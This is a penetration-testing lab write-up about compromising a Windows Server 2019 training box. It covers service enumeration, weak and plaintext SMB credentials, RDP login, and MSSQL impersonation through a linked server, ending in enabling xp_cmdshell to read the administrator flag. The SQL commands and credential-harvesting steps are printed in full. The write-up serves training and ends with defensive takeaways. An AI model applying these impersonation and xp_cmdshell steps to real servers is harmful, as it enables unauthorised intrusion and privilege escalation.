# Attacking Common Services - Hard

## Engagement Overview

**Target:** Internal server in `inlanefreight.htb`

**Box IP:** `10.129.117.207`

**OS Details:** Windows Server 2019 (Build 17763)

**Hostname:** WIN-HARD

**Description:**
 The host is an internal Windows server used to manage files and working material (e.g., HR/IT forms). It also runs Microsoft SQL Server, whose purpose appeared unclear but ultimately provided a route to escalation. Access vectors included SMB shares with leaked credentials, RDP, and SQL Server impersonation.

------

## Objectives

- Enumerate Windows services and shares
- Identify valid SMB credentials
- Escalate from SMB access to RDP session
- Abuse SQL Server impersonation to gain administrator access
- Capture the system flag

------

## Service Enumeration

### Nmap Results

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**Notes:**

- SMB allowed authentication attempts, signing not required.
- SQL Server 2019 accessible, showing linked servers and impersonation potential.
- RDP open and accessible after credentials discovery.

------

## Methodologies

1. **SMB Enumeration & Access**

   - Discovered working credentials with CrackMapExec:

   ```text
   user: simon
   password: liverpool
   ```

   - Enumerated shares with `smbmap` and discovered directories `HR/`, `IT/`, `OPS/`, and `Projects/` under `Home`.
   - Found multiple files including `creds.txt` under `IT/Fiona`.

2. **Credential Harvesting**

   - `creds.txt` yielded multiple valid passwords:

   ```text
   fiona: 48Ns72!bns74@S84NNNSl
   fiona: Kaksd032klasdA#
   ```

3. **RDP Access**

   - Used Fiona’s credentials to log in via RDP, confirming GUI access.

4. **SQL Server Abuse**

   - Within the environment, identified impersonation permissions in MSSQL:

   ```sql
   SELECT distinct b.name
   FROM sys.server_permissions a
   INNER JOIN sys.server_principals b
   ON a.grantor_principal_id = b.principal_id
   WHERE a.permission_name = 'IMPERSONATE';
   ```

   - Pivoted with impersonation of `john` and leveraged a linked server:

   ```sql
   EXECUTE AS LOGIN = 'john';
   EXECUTE('select @@servername, @@version, system_user') AT [LOCAL.TEST.LINKED.SRV];
   ```

5. **Command Execution via xp_cmdshell**

   - Enabled advanced options and `xp_cmdshell` remotely:

   ```sql
   EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; \
           EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
   ```

   - Executed command to retrieve Administrator’s flag:

   ```sql
   EXECUTE('xp_cmdshell ''more c:\\users\\administrator\\desktop\\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
   ```

------

## Initial Access – `smb`/`rdp`

**Vulnerability Explanation:**
Weak credentials (`simon:liverpool`) and plaintext passwords in `creds.txt` allowed lateral access across SMB and RDP.

**Penetration:**

- Connected to SMB shares with valid credentials.
- Harvested additional credentials.
- Gained RDP session as `fiona`.

------

## Privilege Escalation – MSSQL Impersonation

**Vulnerability Explanation:**
SQL Server misconfiguration allowed impersonation of other users, including accounts linked to sysadmin privileges on a remote/linked server.

**Result:**
Achieved command execution as Administrator and read the system flag.

------

## Post-Exploitation

Potential follow‑ups if scope expanded:

- Enumerate entire SQL database for sensitive records
- Investigate HR and OPS share contents for PII
- Assess RDP access logging and monitoring gaps

------

## Tools Utilized

- `nmap`
- `crackmapexec`
- `smbmap`
- `hydra`
- `rdp`
- `mssql-cli`

------

## Key Takeaways

- Weak/reused SMB credentials can expose entire Windows environments.
- MSSQL impersonation and linked servers represent dangerous privilege escalation vectors.
- File shares often hold plaintext secrets (creds.txt, notes, etc.) that enable lateral movement.